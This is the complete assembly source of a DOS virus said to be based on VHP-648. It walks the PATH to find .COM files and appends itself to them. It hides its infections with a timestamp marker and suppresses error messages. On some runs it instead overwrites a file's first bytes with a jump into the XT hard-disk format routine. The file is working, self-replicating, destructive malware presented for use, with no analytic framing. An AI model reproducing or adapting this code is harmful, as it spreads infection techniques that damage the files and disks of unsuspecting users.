	name	Virus
	title	Virus; based on the famous VHP-648 virus
	.radix	16

code	segment
	assume	cs:code,ds:code

	org	100

environ equ	2C

newjmp	equ	7Bh		;Code of jmp instruction
codeptr equ	7A		;Here is formed a jump to virus code
pname	equ	78		;Offset of file name in dir path
poffs	equ	76		;Address of 'PATH' string
errhnd	equ	74		;Old error handler
fname	equ	70		;Path name to search for
mydta	equ	2C		;DTA for Find First/Next:
attrib	equ	17		;File attribute
time	equ	16		;File time
date	equ	14		;File date
fsize	equ	12		;File size
namez	equ	0E		;File name found

start:
	jmp	short virus
	nop
	int	20

data	label	byte		;Data section
saveins db	3 dup (90)	;Original first 3 bytes
allcom	db	'*.COM',0       ;Filespec to search for
pathstr db	'PATH='

;This replaces the first instruction of a destroyed file.
;It's a jmp instruction into the hard disk formatting program (IBM XT only):

bad_jmp db	0EA,5,0,0,0C8

virus:
	push	ax
	push	cx		;Save CX

	call	self		;Detrmine the program start address
	nop			;For those looking for the E80000 pattern
self:
	pop	bx
	sub	bx,self-data-1	;Keep BX pointed at data
	cld
	lea	si,[bx+saveins-data]	;Instruction saved there
	mov	di,offset start
	mov	cx,3		;Move 3 bytes
	rep	movsb		;Do it
	mov	si,bx		;Keep SI pointed at data

	push	bp		;Reserve local storage
	mov	bp,sp
	sub	sp,7C

	mov	ah,30		;Get DOS version
	int	21
	cmp	al,0		;Less than 2.0?
	jne	skip1
	jmp	exit		;Exit if so

skip1:
	push	es		;Save ES
	mov	ax,3524 	;Get interrupt 24h handler
	int	21		; and save it in errhnd
	mov	[bp-errhnd],bx
	mov	[bp-errhnd+2],es

	mov	ah,25		;Set interrupt 24h handler
	lea	dx,[si+handler-data]
	int	21

	lea	dx,[bp-mydta]
	mov	ah,1A		;Set DTA
	int	21

	push	si
	mov	es,ds:[environ] ;Environment address
	xor	di,di
	mov	bx,si
srchfirst:			;Search 'PATH' in environment
	lea	si,[bx+pathstr-data]
	lodsb
	scasb			;Search for first letter ('P')
	jne	nextp
	mov	cx,4		;4 letters in 'ATH='
	rep	cmpsb
	je	pfound		;PATH found, continue
nextp:
	cmp	byte ptr es:[di],0
	je	notfound	;End of environment?
	mov	cx,8000 	;Maximum 32 K in environment
	mov	al,0		;If not, skip thru next 0
	repne	scasb		; (i.e. go to next variable)
	jmp	srchfirst	; and search again
notfound:
	xor	di,di		;0 indicates no PATH found
pfound:
	pop	si		;Restore SI & ES
	pop	es

	mov	[bp-poffs],di	;Save 'PATH' offset in poffs
	lea	di,[bp-fname]
	mov	[bp-pname],di

filesrch:
	lea	si,[bx+allcom-data]
	mov	cl,3		;3 words in ASCIIZ '*.COM'
	rep	movsw		;Move '*.COM' at fname
	mov	si,bx		;Restore SI

	mov	ah,4E		;Find first file
	lea	dx,[bp-fname]
	mov	cl,11b		;Hidden, Read/Only or Normal files
	int	21
	jc	nextdir 	;If not found, search in another directory

checkfile:
	mov	al,[bp-time]	;Check file time
	and	al,11111b	; (the seconds, more exactly)
	cmp	al,62d/2	;Are they 62?

;If so, file is already contains the virus, search for another:

	je	findnext

;Is file size greather than 64,000 bytes?

	cmp	[bp-fsize],64000d
	ja	findnext	;If so, search for next file

;Is file size greater or equal to 10 bytes?

	cmp	word ptr [bp-fsize],10d
	jae	process 	;If so, process file

findnext:			;Otherwise find the next file
	mov	ah,4F		;Find next file
	int	21
	jnc	checkfile	;If found, go chech some conditions

nextdir:
	mov	si,[bp-poffs]
	or	si,si
	jnz	skip2
	jmp	olddta		;Exit if end of environment reached
skip2:
	push	ds		;Save DS
	lea	di,[bp-fname]	;Point ES:DI at fname
	mov	ds,ds:[environ] ;Point DS:SI at the PATH variable found
cpydir:
	lodsb			;Get a char from the PATH variable
	cmp	al,';'          ;`;' means end of directory
	je	enddir
	cmp	al,0		;0 means end of PATH variable
	je	endpath
	stosb			;Put the char in fname
	jmp	cpydir		;Loop until done
endpath:
	xor	si,si		;Zero SI to indicate end of PATH
enddir:
	pop	ds		;Restore DS
	mov	[bp-poffs],si
	cmp	byte ptr [di-1],'\'
	je	skip3
	mov	al,'\'          ;Add '\' if not already present
	stosb
skip3:
	mov	[bp-pname],di
	jmp	filesrch

process:
	mov	di,[bp-pname]
	lea	si,[bp-namez]	;Point SI at namez
cpyname:
	lodsb			;Copy name found to fname
	stosb
	cmp	al,0
	jne	cpyname
	mov	si,bx		;Restore SI

	mov	ax,4301 	;Set file attributes
	mov	cl,[bp-attrib]
	and	cl,not 1	;Turn off Read Only flag
	int	21

	mov	ax,3D02 	;Open file with Read/Write access
	int	21
	jc	oldattr 	;Exit on error
	mov	bx,ax		;Save file handle in BX

	mov	ah,2C		;Get system time
	int	21
	and	dh,111b 	;Are seconds a multiple of 8?
	jnz	infect		;If not, contaminate file (don't destroy):

;Destroy file by rewriting an illegal jmp as first instruction:

	mov	ah,40		;Write to file handle
	mov	cx,5		;Write 5 bytes
	lea	dx,[si+bad_jmp-data]	;Write THESE bytes
	int	21		;Do it
	jmp	short oldtime	;Exit

;Try to contaminate file:

;Read first instruction of the file (first 3 bytes) and save it in saveins:

infect:
	mov	ah,3F		;Read from file handle
	mov	cx,3		;Read 3 bytes
	lea	dx,[si+saveins-data]	;Put them there
	int	21
	jc	oldtime 	;Exit on error
	cmp	ax,3		;Are really 3 bytes read?
	jne	oldtime 	;Exit if not

;Move file pointer to end of file:

	mov	ax,4202 	;LSEEK from end of file
	xor	cx,cx		;0 bytes from end
	xor	dx,dx
	int	21
	jc	oldtime 	;Exit on error

	add	ax,virus-data-3 ;Add virus data length to get code offset
	mov	[bp-codeptr],ax ;Save result in codeptr
	mov	byte ptr [bp-newjmp],0E9

	mov	ah,40		;Write to file handle
	mov	cx,endcode-data ;Virus code length as bytes to be written
	mov	dx,si		;Write from data to endcode
	int	21
	jc	oldtime 	;Exit on error
	cmp	ax,endcode-data ;Are all bytes written?
	jne	oldtime 	;Exit if not

	mov	ax,4200 	;LSEEK from the beginning of the file
	xor	cx,cx		;Just at the file beginning
	xor	dx,dx
	int	21
	jc	oldtime 	;Exit on error

;Rewrite the first instruction of the file with a jump to the virus code:

	mov	ah,40		;Write to file handle
	mov	cl,3		;3 bytes to write
	lea	dx,[bp-newjmp]	;Write THESE bytes
	int	21

oldtime:
	mov	dx,[bp-date]	;Restore file date
	mov	cx,[bp-time]	; and time
	or	cl,11111b	;Set seconds to 62 (?!)

	mov	ax,5701 	;Set file date & time
	int	21
	mov	ah,3E		;Close file handle
	int	21

oldattr:
	mov	ax,4301 	;Set file attributes
	mov	cl,[bp-attrib]	;They were saved in fattrib
	mov	ch,0
	lea	dx,[bp-fname]
	int	21

olddta:
	mov	ah,1A		;Set DTA
	mov	dx,80		;Restore DTA
	int	21

	push	ds		;Save DS
	mov	ax,2524 	;Set interrupt 24h handler
	mov	dx,[bp-errhnd]	;Restore saved handler
	mov	ds,[bp-errhnd+2]
	int	21
	pop	ds		;Restore DS

exit:
	mov	sp,bp
	pop	bp		;Restore BP, CX & AX
	pop	cx
	pop	ax
	xor	bx,bx		;Clear registers
	xor	dx,dx
	xor	si,si
	mov	di,offset start ;Jump to CS:100
	push	di		; by doing funny RET
	xor	di,di
	ret

handler:			;Critical error handler
	mov	al,0		;Just ignore error
	iret			; and return
endcode label	byte

code	ends
	end	start
